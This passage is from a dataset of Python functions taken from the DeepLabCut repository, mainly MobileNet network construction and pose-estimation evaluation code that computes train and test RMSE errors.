        with slim.arg_scope(func, **default_arg):
            with _set_arg_scope_defaults(items[1:]):
                yield"
AlexEMG/DeepLabCut,depth_multiplier,"@slim.add_arg_scope
def depth_multiplier(output_params, multiplier, divisible_by=8, min_depth=8, **unused_kwargs):
    if 'num_outputs' not in output_params:
        return
    d = output_params['num_outputs']
    output_params['num_outputs'] = _make_divisible(d * multiplier, divisible_by, min_depth)"
AlexEMG/DeepLabCut,op,"def op(opfunc, multiplier_func=depth_multiplier, **params):
    multiplier = params.pop('multiplier_transform', multiplier_func)
    return _Op(opfunc, params=params, multiplier_func=multiplier)"
AlexEMG/DeepLabCut,safe_arg_scope,"def safe_arg_scope(funcs, **kwargs):
    """"""Returns `slim.arg_scope` with all None arguments removed.

    Arguments:
      funcs: Functions to pass to `arg_scope`.
      **kwargs: Arguments to pass to `arg_scope`.

    Returns:
      arg_scope or No-op context manager.

    Note: can be useful if None value should be interpreted as ""do not overwrite
      this parameter value"".
    """"""
    filtered_args = {name: value for (name, value) in kwargs.items() if value is not None}
    if filtered_args:
        return slim.arg_scope(funcs, **filtered_args)
    else:
        return NoOpScope()"
AlexEMG/DeepLabCut,mobilenet_base,"@slim.add_arg_scope
def mobilenet_base(inputs, conv_defs, multiplier=1.0, final_endpoint=None, output_stride=None, use_explicit_padding=False, scope=None, is_training=False):
    """"""Mobilenet base network.

    Constructs a network from inputs to the given final endpoint. By default
    the network is constructed in inference mode. To create network
    in training mode use:

    with slim.arg_scope(mobilenet.training_scope()):
       logits, endpoints = mobilenet_base(...)

    Args:
      inputs: a tensor of shape [batch_size, height, width, channels].
      conv_defs: A list of op(...) layers specifying the net architecture.
      multiplier: Float multiplier for the depth (number of channels)
        for all convolution ops. The value must be greater than zero. Typical
        usage will be to set this value in (0, 1) to reduce the number of
        parameters or computation cost of the model.
      final_endpoint: The name of last layer, for early termination for
      for V1-based networks: last layer is ""layer_14"", for V2: ""layer_20""
      output_stride: An integer that specifies the requested ratio of input to
        output spatial resolution. If not None, then we invoke atrous convolution
        if necessary to prevent the network from reducing the spatial resolution
        of the activation maps. Allowed values are 1 or any even number, excluding
        zero. Typical values are 8 (accurate fully convolutional mode), 16
        (fast fully convolutional mode), and 32 (classification mode).

        NOTE- output_stride relies on all consequent operators to support dilated
        operators via ""rate"" parameter. This might require wrapping non-conv
        operators to operate properly.

      use_explicit_padding: Use 'VALID' padding for convolutions, but prepad
        inputs so that the output dimensions are the same as if 'SAME' padding
        were used.
      scope: optional variable scope.
      is_training: How to setup batch_norm and other ops. Note: most of the time
        this does not need be set directly. Use mobilenet.training_scope() to set
        up training instead. This parameter is here for backward compatibility
        only. It is safe to set it to the value matching
        training_scope(is_training=...). It is also safe to explicitly set
        it to False, even if there is outer training_scope set to to training.
        (The network will be built in inference mode). If this is set to None,
        no arg_scope is added for slim.batch_norm's is_training parameter.

    Returns:
      tensor_out: output tensor.
      end_points: a set of activations for external use, for example summaries or
                  losses.

    Raises:
      ValueError: depth_multiplier <= 0, or the target output_stride is not
                  allowed.
    """"""
    if multiplier <= 0:
        raise ValueError('multiplier is not greater than zero.')
    conv_defs_defaults = conv_defs.get('defaults', {})
    conv_defs_overrides = conv_defs.get('overrides', {})
    if use_explicit_padding:
        conv_defs_overrides = copy.deepcopy(conv_defs_overrides)
        conv_defs_overrides[slim.conv2d, slim.separable_conv2d] = {'padding': 'VALID'}
    if output_stride is not None:
        if output_stride == 0 or (output_stride > 1 and output_stride % 2):
            raise ValueError('Output stride must be None, 1 or a multiple of 2.')
    with _scope_all(scope, default_scope='Mobilenet'), safe_arg_scope([slim.batch_norm], is_training=is_training), _set_arg_scope_defaults(conv_defs_defaults), _set_arg_scope_defaults(conv_defs_overrides):
        current_stride = 1
        rate = 1
        net = inputs
        end_points = {}
        scopes = {}
        for (i, opdef) in enumerate(conv_defs['spec']):
            params = dict(opdef.params)
            opdef.multiplier_func(params, multiplier)
            stride = params.get('stride', 1)
            if output_stride is not None and current_stride == output_stride:
                layer_stride = 1
                layer_rate = rate
                rate *= stride
            else:
                layer_stride = stride
                layer_rate = 1
                current_stride *= stride
            params['stride'] = layer_stride
            if layer_rate > 1:
                if tuple(params.get('kernel_size', [])) != (1, 1):
                    params['rate'] = layer_rate
            if use_explicit_padding:
                if 'kernel_size' in params:
                    net = _fixed_padding(net, params['kernel_size'], layer_rate)
                else:
                    params['use_explicit_padding'] = True
            end_point = 'layer_%d' % (i + 1)
            try:
                net = opdef.op(net, **params)
            except Exception:
                print('Failed to create op %i: %r params: %r' % (i, opdef, params))
                raise
            end_points[end_point] = net
            scope = os.path.dirname(net.name)
            scopes[scope] = end_point
            if final_endpoint is not None and end_point == final_endpoint:
                break
        for t in net.graph.get_operations():
            scope = os.path.dirname(t.name)
            bn = os.path.basename(t.name)
            if scope in scopes and t.name.endswith('output'):
                end_points[scopes[scope] + '/' + bn] = t.outputs[0]
        return (net, end_points)"
AlexEMG/DeepLabCut,_scope_all,"@contextlib.contextmanager
def _scope_all(scope, default_scope=None):
    with tf.compat.v1.variable_scope(scope, default_name=default_scope) as s, tf.compat.v1.name_scope(s.original_name_scope):
        yield s"
AlexEMG/DeepLabCut,mobilenet,"@slim.add_arg_scope
def mobilenet(inputs, num_classes=1001, prediction_fn=slim.softmax, reuse=None, scope='Mobilenet', base_only=False, **mobilenet_args):
    """"""Mobilenet model for classification, supports both V1 and V2.

    Note: default mode is inference, use mobilenet.training_scope to create
    training network.


    Args:
      inputs: a tensor of shape [batch_size, height, width, channels].
      num_classes: number of predicted classes. If 0 or None, the logits layer
        is omitted and the input features to the logits layer (before dropout)
        are returned instead.
      prediction_fn: a function to get predictions out of logits
        (default softmax).
      reuse: whether or not the network and its variables should be reused. To be
        able to reuse 'scope' must be given.
      scope: Optional variable_scope.
      base_only: if True will only create the base of the network (no pooling
      and no logits).
      **mobilenet_args: passed to mobilenet_base verbatim.
        - conv_defs: list of conv defs
        - multiplier: Float multiplier for the depth (number of channels)
        for all convolution ops. The value must be greater than zero. Typical
        usage will be to set this value in (0, 1) to reduce the number of
        parameters or computation cost of the model.
        - output_stride: will ensure that the last layer has at most total stride.
        If the architecture calls for more stride than that provided
        (e.g. output_stride=16, but the architecture has 5 stride=2 operators),
        it will replace output_stride with fractional convolutions using Atrous
        Convolutions.

    Returns:
      logits: the pre-softmax activations, a tensor of size
        [batch_size, num_classes]
      end_points: a dictionary from components of the network to the corresponding
        activation tensor.

    Raises:
      ValueError: Input rank is invalid.
    """"""
    is_training = mobilenet_args.get('is_training', False)
    input_shape = inputs.get_shape().as_list()
    if len(input_shape) != 4:
        raise ValueError('Expected rank 4 input, was: %d' % len(input_shape))
    with tf.compat.v1.variable_scope(scope, 'Mobilenet', reuse=reuse) as scope:
        inputs = tf.identity(inputs, 'input')
        (net, end_points) = mobilenet_base(inputs, scope=scope, **mobilenet_args)
        if base_only:
            return (net, end_points)
        net = tf.identity(net, name='embedding')
        with tf.compat.v1.variable_scope('Logits'):
            net = global_pool(net)
            end_points['global_pool'] = net
            if not num_classes:
                return (net, end_points)
            net = slim.dropout(net, scope='Dropout', is_training=is_training)
            logits = slim.conv2d(net, num_classes, [1, 1], activation_fn=None, normalizer_fn=None, biases_initializer=tf.compat.v1.zeros_initializer(), scope='Conv2d_1c_1x1')
            logits = tf.squeeze(logits, [1, 2])
            logits = tf.identity(logits, name='output')
        end_points['Logits'] = logits
        if prediction_fn:
            end_points['Predictions'] = prediction_fn(logits, 'Predictions')
    return (logits, end_points)"
AlexEMG/DeepLabCut,global_pool,"def global_pool(input_tensor, pool_op=tf.nn.avg_pool2d):
    """"""Applies avg pool to produce 1x1 output.

    NOTE: This function is functionally equivalent to reduce_mean, but it has
    baked in average pool which has better support across hardware.

    Args:
      input_tensor: input tensor
      pool_op: pooling op (avg pool is default)
    Returns:
      a tensor batch_size x 1 x 1 x depth.
    """"""
    shape = input_tensor.get_shape().as_list()
    if shape[1] is None or shape[2] is None:
        kernel_size = tf.convert_to_tensor(value=[1, tf.shape(input=input_tensor)[1], tf.shape(input=input_tensor)[2], 1])
    else:
        kernel_size = [1, shape[1], shape[2], 1]
    output = pool_op(input_tensor, ksize=kernel_size, strides=[1, 1, 1, 1], padding='VALID')
    output.set_shape([None, 1, 1, None])
    return output"
AlexEMG/DeepLabCut,training_scope,"def training_scope(is_training=True, weight_decay=4e-05, stddev=0.09, dropout_keep_prob=0.8, bn_decay=0.997):
    """"""Defines Mobilenet training scope.

    Usage:
       with tf.contrib.slim.arg_scope(mobilenet.training_scope()):
         logits, endpoints = mobilenet_v2.mobilenet(input_tensor)

       # the network created will be trainble with dropout/batch norm
       # initialized appropriately.
    Args:
      is_training: if set to False this will ensure that all customizations are
        set to non-training mode. This might be helpful for code that is reused
        across both training/evaluation, but most of the time training_scope with
        value False is not needed. If this is set to None, the parameters is not
        added to the batch_norm arg_scope.

      weight_decay: The weight decay to use for regularizing the model.
      stddev: Standard deviation for initialization, if negative uses xavier.
      dropout_keep_prob: dropout keep probability (not set if equals to None).
      bn_decay: decay for the batch norm moving averages (not set if equals to
        None).

    Returns:
      An argument scope to use via arg_scope.
    """"""
    batch_norm_params = {'decay': bn_decay, 'is_training': is_training}
    if stddev < 0:
        weight_intitializer = slim.initializers.xavier_initializer()
    else:
        weight_intitializer = tf.compat.v1.truncated_normal_initializer(stddev=stddev)
    with slim.arg_scope([slim.conv2d, slim.fully_connected, slim.separable_conv2d], weights_initializer=weight_intitializer, normalizer_fn=slim.batch_norm), slim.arg_scope([mobilenet_base, mobilenet], is_training=is_training), safe_arg_scope([slim.batch_norm], **batch_norm_params), safe_arg_scope([slim.dropout], is_training=is_training, keep_prob=dropout_keep_prob), slim.arg_scope([slim.conv2d], weights_regularizer=tf.keras.regularizers.l2(0.5 * weight_decay)), slim.arg_scope([slim.separable_conv2d], weights_regularizer=None) as s:
        return s"
AlexEMG/DeepLabCut,__enter__,"def __enter__(self):
    return None"
AlexEMG/DeepLabCut,__exit__,"def __exit__(self, exc_type, exc_value, traceback):
    return False"
AlexEMG/DeepLabCut,mobilenet,"@slim.add_arg_scope
def mobilenet(input_tensor, num_classes=1001, depth_multiplier=1.0, scope='MobilenetV2', conv_defs=None, finegrain_classification_mode=False, min_depth=None, divisible_by=None, activation_fn=None, **kwargs):
    """"""Creates mobilenet V2 network.

    Inference mode is created by default. To create training use training_scope
    below.

    with tf.contrib.slim.arg_scope(mobilenet_v2.training_scope()):
       logits, endpoints = mobilenet_v2.mobilenet(input_tensor)

    Args:
      input_tensor: The input tensor
      num_classes: number of classes
      depth_multiplier: The multiplier applied to scale number of
      channels in each layer.
      scope: Scope of the operator
      conv_defs: Allows to override default conv def.
      finegrain_classification_mode: When set to True, the model
      will keep the last layer large even for small multipliers. Following
      https://arxiv.org/abs/1801.04381
      suggests that it improves performance for ImageNet-type of problems.
        *Note* ignored if final_endpoint makes the builder exit earlier.
      min_depth: If provided, will ensure that all layers will have that
      many channels after application of depth multiplier.
      divisible_by: If provided will ensure that all layers # channels
      will be divisible by this number.
      activation_fn: Activation function to use, defaults to tf.nn.relu6 if not
        specified.
      **kwargs: passed directly to mobilenet.mobilenet:
        prediction_fn- what prediction function to use.
        reuse-: whether to reuse variables (if reuse set to true, scope
        must be given).
    Returns:
      logits/endpoints pair

    Raises:
      ValueError: On invalid arguments
    """"""
    if conv_defs is None:
        conv_defs = V2_DEF
    if 'multiplier' in kwargs:
        raise ValueError('mobilenetv2 doesn\'t support generic multiplier parameter use ""depth_multiplier"" instead.')
    if finegrain_classification_mode:
        conv_defs = copy.deepcopy(conv_defs)
        if depth_multiplier < 1:
            conv_defs['spec'][-1].params['num_outputs'] /= depth_multiplier
    if activation_fn:
        conv_defs = copy.deepcopy(conv_defs)
        defaults = conv_defs['defaults']
        conv_defaults = defaults[slim.conv2d, slim.fully_connected, slim.separable_conv2d]
        conv_defaults['activation_fn'] = activation_fn
    depth_args = {}
    if min_depth is not None:
        depth_args['min_depth'] = min_depth
    if divisible_by is not None:
        depth_args['divisible_by'] = divisible_by
    with slim.arg_scope((lib.depth_multiplier,), **depth_args):
        return lib.mobilenet(input_tensor, num_classes=num_classes, conv_defs=conv_defs, scope=scope, multiplier=depth_multiplier, **kwargs)"
AlexEMG/DeepLabCut,wrapped_partial,"def wrapped_partial(func, *args, **kwargs):
    partial_func = functools.partial(func, *args, **kwargs)
    functools.update_wrapper(partial_func, func)
    return partial_func"
AlexEMG/DeepLabCut,mobilenet_base,"@slim.add_arg_scope
def mobilenet_base(input_tensor, depth_multiplier=1.0, **kwargs):
    """"""Creates base of the mobilenet (no pooling and no logits) .""""""
    return mobilenet(input_tensor, depth_multiplier=depth_multiplier, base_only=True, **kwargs)"
AlexEMG/DeepLabCut,training_scope,"def training_scope(**kwargs):
    """"""Defines MobilenetV2 training scope.

    Usage:
       with tf.contrib.slim.arg_scope(mobilenet_v2.training_scope()):
         logits, endpoints = mobilenet_v2.mobilenet(input_tensor)

    with slim.

    Args:
      **kwargs: Passed to mobilenet.training_scope. The following parameters
      are supported:
        weight_decay- The weight decay to use for regularizing the model.
        stddev-  Standard deviation for initialization, if negative uses xavier.
        dropout_keep_prob- dropout keep probability
        bn_decay- decay for the batch norm moving averages.

    Returns:
      An `arg_scope` to use for the mobilenet v2 model.
    """"""
    return lib.training_scope(**kwargs)"
AlexEMG/DeepLabCut,pairwisedistances,"def pairwisedistances(DataCombined, scorer1, scorer2, pcutoff=-1, bodyparts=None):
    """"""Calculates the pairwise Euclidean distance metric over body parts vs. images""""""
    mask = DataCombined[scorer2].xs('likelihood', level=1, axis=1) >= pcutoff
    if bodyparts is None:
        Pointwisesquareddistance = (DataCombined[scorer1] - DataCombined[scorer2]) ** 2
        RMSE = np.sqrt(Pointwisesquareddistance.xs('x', level=1, axis=1) + Pointwisesquareddistance.xs('y', level=1, axis=1))
        return (RMSE, RMSE[mask])
    else:
        Pointwisesquareddistance = (DataCombined[scorer1][bodyparts] - DataCombined[scorer2][bodyparts]) ** 2
        RMSE = np.sqrt(Pointwisesquareddistance.xs('x', level=1, axis=1) + Pointwisesquareddistance.xs('y', level=1, axis=1))
        return (RMSE, RMSE[mask])"
AlexEMG/DeepLabCut,distance,"def distance(v, w):
    return np.sqrt(np.sum((v - w) ** 2))"
AlexEMG/DeepLabCut,calculatepafdistancebounds,"def calculatepafdistancebounds(config, shuffle=0, trainingsetindex=0, modelprefix='', numdigits=0, onlytrain=False):
    """"""
    Returns distances along paf edges in train/test data

    ----------
    config : string
        Full path of the config.yaml file as a string.

    shuffle: integer
        integers specifying shuffle index of the training dataset. The default is 0.

    trainingsetindex: int, optional
        Integer specifying which TrainingsetFraction to use. By default the first (note that TrainingFraction is a list in config.yaml). This
        variable can also be set to ""all"".

    numdigits: number of digits to round for distances.

    """"""
    import os
    from deeplabcut.utils import auxiliaryfunctions, auxfun_multianimal
    from deeplabcut.pose_estimation_tensorflow.config import load_config
    cfg = auxiliaryfunctions.read_config(config)
    if cfg['multianimalproject']:
        (individuals, uniquebodyparts, multianimalbodyparts) = auxfun_multianimal.extractindividualsandbodyparts(cfg)
        trainingsetfolder = auxiliaryfunctions.get_training_set_folder(cfg)
        trainFraction = cfg['TrainingFraction'][trainingsetindex]
        modelfolder = os.path.join(cfg['project_path'], str(auxiliaryfunctions.get_model_folder(trainFraction, shuffle, cfg, modelprefix=modelprefix)))
        Data = pd.read_hdf(os.path.join(cfg['project_path'], str(trainingsetfolder), 'CollectedData_' + cfg['scorer'] + '.h5'))[cfg['scorer']]
        (path_train_config, path_test_config, _) = return_train_network_path(config=config, shuffle=shuffle, trainingsetindex=trainingsetindex, modelprefix=modelprefix)
        train_pose_cfg = load_config(str(path_train_config))
        test_pose_cfg = load_config(str(path_test_config))
        (_, trainIndices, _, _) = auxiliaryfunctions.load_metadata(Path(cfg['project_path']) / train_pose_cfg['metadataset'])
        partaffinityfield_graph = test_pose_cfg['partaffinityfield_graph']
        jointnames = [test_pose_cfg['all_joints_names'][i] for i in range(len(test_pose_cfg['all_joints']))]
        path_inferencebounds_config = Path(modelfolder) / 'test' / 'inferencebounds.yaml'
        inferenceboundscfg = {}
        for (pi, edge) in enumerate(partaffinityfield_graph):
            (j1, j2) = (jointnames[edge[0]], jointnames[edge[1]])
            ds_within = []
            ds_across = []
            for ind in individuals:
                for ind2 in individuals:
                    if ind != 'single' and ind2 != 'single':
                        if (ind, j1, 'x') in Data.keys() and (ind2, j2, 'y') in Data.keys():
                            distances = np.sqrt((Data[ind, j1, 'x'] - Data[ind2, j2, 'x']) ** 2 + (Data[ind, j1, 'y'] - Data[ind2, j2, 'y']) ** 2) / test_pose_cfg['stride']
                        else:
                            distances = None
                        if distances is not None:
                            if onlytrain:
                                distances = distances.iloc[trainIndices]
                            if ind == ind2:
                                ds_within.extend(distances.values.flatten())
                            else:
                                ds_across.extend(distances.values.flatten())
            edgeencoding = str(edge[0]) + '_' + str(edge[1])
            inferenceboundscfg[edgeencoding] = {}
            if len(ds_within) > 0:
                inferenceboundscfg[edgeencoding]['intra_max'] = str(round(np.nanmax(ds_within), numdigits))
                inferenceboundscfg[edgeencoding]['intra_min'] = str(round(np.nanmin(ds_within), numdigits))
            else:
                inferenceboundscfg[edgeencoding]['intra_max'] = str(100000.0)
                inferenceboundscfg[edgeencoding]['intra_min'] = str(0)
            if len(ds_across) > 0:
                inferenceboundscfg[edgeencoding]['inter_max'] = str(round(np.nanmax(ds_across), numdigits))
                inferenceboundscfg[edgeencoding]['inter_min'] = str(round(np.nanmin(ds_across), numdigits))
            else:
                inferenceboundscfg[edgeencoding]['inter_max'] = str(100000.0)
                inferenceboundscfg[edgeencoding]['inter_min'] = str(0)
        auxiliaryfunctions.write_plainconfig(str(path_inferencebounds_config), dict(inferenceboundscfg))
        return inferenceboundscfg
    else:
        print('You might as well bring owls to Athens.')
        return {}"
AlexEMG/DeepLabCut,Plotting,"def Plotting(cfg, comparisonbodyparts, DLCscorer, trainIndices, DataCombined, foldername):
    """"""Function used for plotting GT and predictions""""""
    from deeplabcut.utils import visualization
    colors = visualization.get_cmap(len(comparisonbodyparts), name=cfg['colormap'])
    NumFrames = np.size(DataCombined.index)
    (fig, ax) = visualization.create_minimal_figure()
    for ind in tqdm(np.arange(NumFrames)):
        ax = visualization.plot_and_save_labeled_frame(DataCombined, ind, trainIndices, cfg, colors, comparisonbodyparts, DLCscorer, foldername, fig, ax)
        visualization.erase_artists(ax)"
AlexEMG/DeepLabCut,return_evaluate_network_data,"def return_evaluate_network_data(config, shuffle=0, trainingsetindex=0, comparisonbodyparts='all', Snapindex=None, rescale=False, fulldata=False, show_errors=True, modelprefix='', returnjustfns=True):
    """"""
    Returns the results for (previously evaluated) network. deeplabcut.evaluate_network(..)
    Returns list of (per model): [trainingsiterations,trainfraction,shuffle,trainerror,testerror,pcutoff,trainerrorpcutoff,testerrorpcutoff,Snapshots[snapindex],scale,net_type]

    If fulldata=True, also returns (the complete annotation and prediction array)
    Returns list of: (DataMachine, Data, data, trainIndices, testIndices, trainFraction, DLCscorer,comparisonbodyparts, cfg, Snapshots[snapindex])
    ----------
    config : string
        Full path of the config.yaml file as a string.

    shuffle: integer
        integers specifying shuffle index of the training dataset. The default is 0.

    trainingsetindex: int, optional
        Integer specifying which TrainingsetFraction to use. By default the first (note that TrainingFraction is a list in config.yaml). This
        variable can also be set to ""all"".

    comparisonbodyparts: list of bodyparts, Default is ""all"".
        The average error will be computed for those body parts only (Has to be a subset of the body parts).

    rescale: bool, default False
        Evaluate the model at the 'global_scale' variable (as set in the test/pose_config.yaml file for a particular project). I.e. every
        image will be resized according to that scale and prediction will be compared to the resized ground truth. The error will be reported
        in pixels at rescaled to the *original* size. I.e. For a [200,200] pixel image evaluated at global_scale=.5, the predictions are calculated
        on [100,100] pixel images, compared to 1/2*ground truth and this error is then multiplied by 2!. The evaluation images are also shown for the
        original size!

    Examples
    --------
    If you do not want to plot
    >>> deeplabcut._evaluate_network_data('/analysis/project/reaching-task/config.yaml', shuffle=[1])
    --------
    If you want to plot
    >>> deeplabcut.evaluate_network('/analysis/project/reaching-task/config.yaml',shuffle=[1],plotting=True)
    """"""
    import os
    from deeplabcut.pose_estimation_tensorflow.config import load_config
    from deeplabcut.utils import auxiliaryfunctions
    start_path = os.getcwd()
    cfg = auxiliaryfunctions.read_config(config)
    trainingsetfolder = auxiliaryfunctions.get_training_set_folder(cfg)
    comparisonbodyparts = auxiliaryfunctions.intersection_of_body_parts_and_ones_given_by_user(cfg, comparisonbodyparts)
    trainFraction = cfg['TrainingFraction'][trainingsetindex]
    modelfolder = os.path.join(cfg['project_path'], str(auxiliaryfunctions.get_model_folder(trainFraction, shuffle, cfg, modelprefix=modelprefix)))
    (path_train_config, path_test_config, _) = return_train_network_path(config=config, shuffle=shuffle, trainingsetindex=trainingsetindex, modelprefix=modelprefix)
    try:
        test_pose_cfg = load_config(str(path_test_config))
    except FileNotFoundError:
        raise FileNotFoundError('It seems the model for shuffle %s and trainFraction %s does not exist.' % (shuffle, trainFraction))
    train_pose_cfg = load_config(str(path_train_config))
    (data, trainIndices, testIndices, _) = auxiliaryfunctions.load_metadata(Path(cfg['project_path']) / train_pose_cfg['metadataset'])
    if rescale == True:
        scale = test_pose_cfg['global_scale']
        print('Rescaling Data to ', scale)
        Data = pd.read_hdf(os.path.join(cfg['project_path'], str(trainingsetfolder), 'CollectedData_' + cfg['scorer'] + '.h5')) * scale
    else:
        scale = 1
        Data = pd.read_hdf(os.path.join(cfg['project_path'], str(trainingsetfolder), 'CollectedData_' + cfg['scorer'] + '.h5'))
    evaluationfolder = os.path.join(cfg['project_path'], str(auxiliaryfunctions.get_evaluation_folder(trainFraction, shuffle, cfg, modelprefix=modelprefix)))
    Snapshots = np.array([fn.split('.')[0] for fn in os.listdir(os.path.join(str(modelfolder), 'train')) if 'index' in fn])
    if len(Snapshots) == 0:
        print(""Snapshots not found! It seems the dataset for shuffle %s and trainFraction %s is not trained.\nPlease train it before evaluating.\nUse the function 'train_network' to do so."" % (shuffle, trainFraction))
        snapindices = []
    else:
        increasing_indices = np.argsort([int(m.split('-')[1]) for m in Snapshots])
        Snapshots = Snapshots[increasing_indices]
        if Snapindex is None:
            Snapindex = cfg['snapshotindex']
        if Snapindex == -1:
            snapindices = [-1]
        elif Snapindex == 'all':
            snapindices = range(len(Snapshots))
        elif Snapindex < len(Snapshots):
            snapindices = [Snapindex]
        else:
            print('Invalid choice, only -1 (last), any integer up to last, or all (as string)!')
    DATA = []
    results = []
    resultsfns = []
    for snapindex in snapindices:
        test_pose_cfg['init_weights'] = os.path.join(str(modelfolder), 'train', Snapshots[snapindex])
        trainingsiterations = test_pose_cfg['init_weights'].split(os.sep)[-1].split('-')[-1]
        (DLCscorer, DLCscorerlegacy) = auxiliaryfunctions.get_scorer_name(cfg, shuffle, trainFraction, trainingsiterations, modelprefix=modelprefix)
        if not returnjustfns:
            print('Retrieving ', DLCscorer, ' with # of trainingiterations:', trainingsiterations)
        (notanalyzed, resultsfilename, DLCscorer) = auxiliaryfunctions.check_if_not_evaluated(str(evaluationfolder), DLCscorer, DLCscorerlegacy, Snapshots[snapindex])
        print(resultsfilename)
        resultsfns.append(resultsfilename)
        if not returnjustfns:
            if not notanalyzed and os.path.isfile(resultsfilename):
                DataMachine = pd.read_hdf(resultsfilename)
                DataCombined = pd.concat([Data.T, DataMachine.T], axis=0).T
                (RMSE, RMSEpcutoff) = pairwisedistances(DataCombined, cfg['scorer'], DLCscorer, cfg['pcutoff'], comparisonbodyparts)
                testerror = np.nanmean(RMSE.iloc[testIndices].values.flatten())
                trainerror = np.nanmean(RMSE.iloc[trainIndices].values.flatten())
                testerrorpcutoff = np.nanmean(RMSEpcutoff.iloc[testIndices].values.flatten())
                trainerrorpcutoff = np.nanmean(RMSEpcutoff.iloc[trainIndices].values.flatten())
                if show_errors == True:
                    print('Results for', trainingsiterations, ' training iterations:', int(100 * trainFraction), shuffle, 'train error:', np.round(trainerror, 2), 'pixels. Test error:', np.round(testerror, 2), ' pixels.')
                    print('With pcutoff of', cfg['pcutoff'], ' train error:', np.round(trainerrorpcutoff, 2), 'pixels. Test error:', np.round(testerrorpcutoff, 2), 'pixels')
                    print('Snapshot', Snapshots[snapindex])
                r = [trainingsiterations, int(100 * trainFraction), shuffle, np.round(trainerror, 2), np.round(testerror, 2), cfg['pcutoff'], np.round(trainerrorpcutoff, 2), np.round(testerrorpcutoff, 2), Snapshots[snapindex], scale, test_pose_cfg['net_type']]
                results.append(r)
            else:
                print('Model not trained/evaluated!')
            if fulldata == True:
                DATA.append([DataMachine, Data, data, trainIndices, testIndices, trainFraction, DLCscorer, comparisonbodyparts, cfg, evaluationfolder, Snapshots[snapindex]])
    os.chdir(start_path)
    if returnjustfns:
        return resultsfns
    elif fulldata == True:
        return (DATA, results)
    else:
        return results"
AlexEMG/DeepLabCut,keypoint_error,"def keypoint_error(df_error: pd.DataFrame, df_error_p_cutoff: pd.DataFrame, train_indices: List[int], test_indices: List[int]) -> pd.DataFrame:
    """"""Computes the RMSE error for each bodypart

    The error dataframes can be in single animal format (non-hierarchical columns, one
    column for each bodypart) or multi-animal format (hierarchical columns with 3
    levels: ""scorer"", ""individuals"", ""bodyparts"").

    Args:
        df_error: dataframe containing the RMSE error for each image, individual and
            bodypart
        df_error_p_cutoff: dataframe containing the RMSE error with p-cutoff for each
            image, individual and bodypart
        train_indices: the indices of rows in the dataframe that are in the train set
        test_indices: the indices of rows in the dataframe that are in the test set

    Returns:
        A dataframe containing 4 rows (train and test error, with and without p-cutoff)
        and one column for each bodypart.
    """"""
    df_error = df_error.copy()
    df_error_p_cutoff = df_error_p_cutoff.copy()
    error_rows = []
    for (row_name, df) in [('Train error (px)', df_error.iloc[train_indices, :]), ('Test error (px)', df_error.iloc[test_indices, :]), ('Train error (px) with p-cutoff', df_error_p_cutoff.iloc[train_indices, :]), ('Test error (px) with p-cutoff', df_error_p_cutoff.iloc[test_indices, :])]:
        df_flat = df.copy()
        if isinstance(df.columns, pd.MultiIndex):
            df_flat = df.droplevel('scorer', axis=1).stack(level='individuals').copy()
        bodypart_error = df_flat.mean()
        bodypart_error['Error Type'] = row_name
        error_rows.append(bodypart_error)
    keypoint_error_df = pd.concat(error_rows, axis=1)
    return keypoint_error_df.T.set_index('Error Type')"
AlexEMG/DeepLabCut,evaluate_network,"def evaluate_network(config, Shuffles=[1], trainingsetindex=0, plotting=False, show_errors=True, comparisonbodyparts='all', gputouse=None, rescale=False, modelprefix='', per_keypoint_evaluation: bool=False):
    """"""Evaluates the network.

    Evaluates the network based on the saved models at different stages of the training
    network. The evaluation results are stored in the .h5 and .csv file under the
    subdirectory 'evaluation_results'. Change the snapshotindex parameter in the config
    file to 'all' in order to evaluate all the saved models.

    Parameters
    ----------
    config : string
        Full path of the config.yaml file.

    Shuffles: list, optional, default=[1]
        List of integers specifying the shuffle indices of the training dataset.

    trainingsetindex: int or str, optional, default=0
        Integer specifying which ""TrainingsetFraction"" to use.
        Note that ""TrainingFraction"" is a list in config.yaml. This variable can also
        be set to ""all"".

    plotting: bool or str, optional, default=False
        Plots the predictions on the train and test images.
        If provided it must be either ``True``, ``False``, ``""bodypart""``, or
        ``""individual""``. Setting to ``True`` defaults as ``""bodypart""`` for
        multi-animal projects.

    show_errors: bool, optional, default=True
        Display train and test errors.

    comparisonbodyparts: str or list, optional, default=""all""
        The average error will be computed for those body parts only.
        The provided list has to be a subset of the defined body parts.

    gputouse: int or None, optional, default=None
        Indicates the GPU to use (see number in ``nvidia-smi``). If you do not have a
        GPU put `None``.
        See: https://nvidia.custhelp.com/app/answers/detail/a_id/3751/~/useful-nvidia-smi-queries

    rescale: bool, optional, default=False
        Evaluate the model at the ``'global_scale'`` variable (as set in the
        ``pose_config.yaml`` file for a particular project). I.e. every image will be
        resized according to that scale and prediction will be compared to the resized
        ground truth. The error will be reported in pixels at rescaled to the
        *original* size. I.e. For a [200,200] pixel image evaluated at
        ``global_scale=.5``, the predictions are calculated on [100,100] pixel images,
        compared to 1/2*ground truth and this error is then multiplied by 2!.
        The evaluation images are also shown for the original size!

    modelprefix: str, optional, default=""""
        Directory containing the deeplabcut models to use when evaluating the network.
        By default, the models are assumed to exist in the project folder.

    per_keypoint_evaluation: bool, default=False
        Compute the train and test RMSE for each keypoint, and save the results to
        a {model_name}-keypoint-results.csv in the evalution-results folder

    Returns
    -------
    None

    Examples
    --------
    If you do not want to plot and evaluate with shuffle set to 1.

    >>> deeplabcut.evaluate_network(
            '/analysis/project/reaching-task/config.yaml', Shuffles=[1],
        )

    If you want to plot and evaluate with shuffle set to 0 and 1.

    >>> deeplabcut.evaluate_network(
            '/analysis/project/reaching-task/config.yaml',
            Shuffles=[0, 1],
            plotting=True,
        )

    If you want to plot assemblies for a maDLC project

    >>> deeplabcut.evaluate_network(
            '/analysis/project/reaching-task/config.yaml',
            Shuffles=[1],
            plotting=""individual"",
        )

    Note: This defaults to standard plotting for single-animal projects.
    """"""
    if plotting not in (True, False, 'bodypart', 'individual'):
        raise ValueError(f'Unknown value for `plotting`={plotting}')
    import os
    start_path = os.getcwd()
    from deeplabcut.utils import auxiliaryfunctions
    cfg = auxiliaryfunctions.read_config(config)
    if cfg.get('multianimalproject', False):
        from .evaluate_multianimal import evaluate_multianimal_full
        evaluate_multianimal_full(config=config, Shuffles=Shuffles, trainingsetindex=trainingsetindex, plotting=plotting, comparisonbodyparts=comparisonbodyparts, gputouse=gputouse, modelprefix=modelprefix, per_keypoint_evaluation=per_keypoint_evaluation)
    else:
        from deeplabcut.utils.auxfun_videos import imread, imresize
        from deeplabcut.pose_estimation_tensorflow.core import predict
        from deeplabcut.pose_estimation_tensorflow.config import load_config
